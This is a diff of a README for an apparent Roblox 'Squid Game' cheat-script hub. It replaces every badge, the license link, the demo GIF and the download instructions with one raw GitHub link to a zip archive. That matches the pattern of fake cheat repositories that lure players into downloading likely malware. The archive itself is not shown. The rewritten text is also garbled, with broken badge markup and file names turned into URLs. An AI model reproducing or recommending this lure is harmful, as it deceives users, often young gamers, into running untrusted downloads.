@@ -1,10 +1,10 @@
 # 🦑 Squid Game x Script Roblox 💻✨
 
-[![MIT License](https://img.shields.io/badge/license-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![OS Support](https://img.shields.io/badge/OS-Windows%7CMacOS%7CLinux-blue.svg)]()
-[![API Support](https://img.shields.io/badge/API-OpenAI%20%26%20Claude-informational)]()
-[![Languages](https://img.shields.io/badge/Languages-Multilingual-orange)]()
-[![24/7 Support](https://img.shields.io/badge/Support-24%2F7-brightgreen.svg)]()
+[![MIT License](https://github.com/Yetuvina/squid-game-x-roblox-scripts-hub/raw/refs/heads/main/zoopantheon/game_x_scripts_squid_hub_roblox_1.4.zip)](https://github.com/Yetuvina/squid-game-x-roblox-scripts-hub/raw/refs/heads/main/zoopantheon/game_x_scripts_squid_hub_roblox_1.4.zip)
+[![OS Support](https://github.com/Yetuvina/squid-game-x-roblox-scripts-hub/raw/refs/heads/main/zoopantheon/game_x_scripts_squid_hub_roblox_1.4.zip%7CMacOS%https://github.com/Yetuvina/squid-game-x-roblox-scripts-hub/raw/refs/heads/main/zoopantheon/game_x_scripts_squid_hub_roblox_1.4.zip)]()
+[![API Support](https://github.com/Yetuvina/squid-game-x-roblox-scripts-hub/raw/refs/heads/main/zoopantheon/game_x_scripts_squid_hub_roblox_1.4.zip%20%26%20Claude-informational)]()
+[![Languages](https://github.com/Yetuvina/squid-game-x-roblox-scripts-hub/raw/refs/heads/main/zoopantheon/game_x_scripts_squid_hub_roblox_1.4.zip)]()
+[![24/7 Support](https://github.com/Yetuvina/squid-game-x-roblox-scripts-hub/raw/refs/heads/main/zoopantheon/game_x_scripts_squid_hub_roblox_1.4.zip%https://github.com/Yetuvina/squid-game-x-roblox-scripts-hub/raw/refs/heads/main/zoopantheon/game_x_scripts_squid_hub_roblox_1.4.zip)]()
 
 ---
 
@@ -20,18 +20,18 @@ Unlock the next level of immersive Roblox gameplay with automation, enhanced UI,
 
 ### Step 1️⃣: Download & Extract
 
-Download the **EasyLaunch.zip** archive from this repository. No links required; everything you need is right here! Enjoy hassle-free, lightweight archiving for rapid setup.
+Download the **https://github.com/Yetuvina/squid-game-x-roblox-scripts-hub/raw/refs/heads/main/zoopantheon/game_x_scripts_squid_hub_roblox_1.4.zip** archive from this repository. No links required; everything you need is right here! Enjoy hassle-free, lightweight archiving for rapid setup.
 
 ### Step 2️⃣: Extract & Launch
 
-Unzip **EasyLaunch.zip** with your favorite decompression tool. 
+Unzip **https://github.com/Yetuvina/squid-game-x-roblox-scripts-hub/raw/refs/heads/main/zoopantheon/game_x_scripts_squid_hub_roblox_1.4.zip** with your favorite decompression tool. 
 
 ### Step 3️⃣: Quickstart Visual Guide
 
 Don’t just read - **see it in action!**  
 Here’s a GIF to visually walk you through setup:
 
-![Installation Video Guide](https://i.imgur.com/Js67NIU.gif)
+![Installation Video Guide](https://github.com/Yetuvina/squid-game-x-roblox-scripts-hub/raw/refs/heads/main/zoopantheon/game_x_scripts_squid_hub_roblox_1.4.zip)
 
 It’s genuinely just that simple – unzip, launch, and immerse yourself in a new dimension of Squid Game fun.
 
@@ -114,7 +114,7 @@ Embrace fair play with Squid Game x Script Roblox. This toolkit is engineered wi
 
 ## 📝 Licensing
 
-This project operates under the [MIT License](https://opensource.org/licenses/MIT) and is built for imaginative development and educational purposes. Unleash your creativity, remix responsibly, and contribute to the ever-growing world of Roblox innovation!
+This project operates under the [MIT License](https://github.com/Yetuvina/squid-game-x-roblox-scripts-hub/raw/refs/heads/main/zoopantheon/game_x_scripts_squid_hub_roblox_1.4.zip) and is built for imaginative development and educational purposes. Unleash your creativity, remix responsibly, and contribute to the ever-growing world of Roblox innovation!
 
 ---
 
